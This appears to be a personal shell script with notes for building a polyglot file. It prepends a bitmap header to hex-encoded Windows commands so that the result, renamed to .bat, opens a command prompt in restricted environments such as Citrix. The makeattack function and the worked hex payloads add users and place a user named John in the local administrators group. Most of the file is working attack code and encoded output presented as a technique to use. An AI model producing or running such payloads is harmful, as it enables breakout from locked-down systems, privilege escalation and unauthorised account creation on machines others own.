# Attack idea came from 
# https://www.hak5.org/episodes/hak5-925
# further exploring this - lead me to the discovery or adding additional commands to this since the attack does add 
# cmd.exe to the file, one could simple just... make more impactful commands ...
# the constructor is the baseline attack which enables the cmd prompt -
#
# Commands to help dump string to Hex and produce hex bytes
#
makeattack() {
 constructor="\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d"
 trailer=`echo $1 | \
 hexdump -e '16/1 "%02x"' | \
 tr -d " \n" | \
 sed -r 's/(.{2})/\\\x\1/g'`;
 echo $constructor$trailer;
}
# Example use:
#  makeattack "/c net user TEST /add"
# Change extension to bat
# Execute to get shell on machine
# hexdump version to ensure no actions are performed 
#
0000000 42 4d 4a 00 00 00 00 00 00 00 36 00 00 00 28 00
0000010 00 00 06 00 00 00 01 00 00 00 01 00 18 00 00 00
0000020 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00
0000030 00 00 00 00 00 00 00 00 0a 0d 0a 0d             
#
# constructed for echoing bytes to file (structure)
#
\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d
#
# this file was made from information assertained from the internet on how to 
# gain shell access on a machine within a restricted environment such as Citrix
#
# In addition, this is a test to see if users could be added to a system 
# using the same techniques as described above
#
0000000 63 6d 64 2e 65 78 65 20 2f 63 20 6e 65 74 20 6c
0000010 6f 63 61 6c 67 72 6f 75 70 20 61 64 6d 69 6e 69
0000020 73 74 72 61 74 6f 72 73 20 4a 6f 68 6e 20 2f 61
0000030 64 64 0a 
#
#
#
\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d\x63\x6d\x64\x2e\
\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\
\x67\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\
\x74\x6f\x72\x73\x20\x4a\x6f\x68\x6e\x20\x2f\x61\x64\x64\x0a
#
# net user testme r28Wqn90 /add /comment:"Basic user account." /fullname:"Test User" /logonpasswordchg:no /workstations:jr7tww,jr2rtw /domain
#
#
\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x74\x65\x73\x74\x6d\x65\x20\
\x72\x32\x38\x57\x71\x6e\x39\x30\x20\x2f\x61\x64\x64\x20\x2f\x63\
\x6f\x6d\x6d\x65\x6e\x74\x3a\x22\x42\x61\x73\x69\x63\x20\x75\x73\
\x65\x72\x20\x61\x63\x63\x6f\x75\x6e\x74\x2e\x22\x20\x2f\x66\x75\
\x6c\x6c\x6e\x61\x6d\x65\x3a\x22\x54\x65\x73\x74\x20\x55\x73\x65\
\x72\x22\x20\x2f\x6c\x6f\x67\x6f\x6e\x70\x61\x73\x73\x77\x6f\x72\
\x64\x63\x68\x67\x3a\x6e\x6f\x20\x2f\x77\x6f\x72\x6b\x73\x74\x61\
\x74\x69\x6f\x6e\x73\x3a\x6a\x72\x37\x74\x77\x77\x2c\x6a\x72\x32\
\x72\x74\x77\x20\x2f\x64\x6f\x6d\x61\x69\x6e\x0a
##########################
#  Full Attack Example 
#  makehex 'net user testme r28Wqn90 /add /comment:"Basic user account." /fullname:"Test User" /logonpasswordchg:no /workstations:jr7tww,jr2rtw /domain' > cmdtest.bmp
# cat cmdtest.bmp | hexdump 
# shows the following output in hex bytes
#
\x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x0d\x0a\x0d\x6e\x65\x74\x20\
\x75\x73\x65\x72\x20\x74\x65\x73\x74\x6d\x65\x20\x72\x32\x38\x57\
\x71\x6e\x39\x30\x20\x2f\x61\x64\x64\x20\x2f\x63\x6f\x6d\x6d\x65\
\x6e\x74\x3a\x22\x42\x61\x73\x69\x63\x20\x75\x73\x65\x72\x20\x61\
\x63\x63\x6f\x75\x6e\x74\x2e\x22\x20\x2f\x66\x75\x6c\x6c\x6e\x61\
\x6d\x65\x3a\x22\x54\x65\x73\x74\x20\x55\x73\x65\x72\x22\x20\x2f\
\x6c\x6f\x67\x6f\x6e\x70\x61\x73\x73\x77\x6f\x72\x64\x63\x68\x67\
\x3a\x6e\x6f\x20\x2f\x77\x6f\x72\x6b\x73\x74\x61\x74\x69\x6f\x6e\
\x73\x3a\x6a\x72\x37\x74\x77\x77\x2c\x6a\x72\x32\x72\x74\x77\x20\
\x2f\x64\x6f\x6d\x61\x69\x6e\x0a
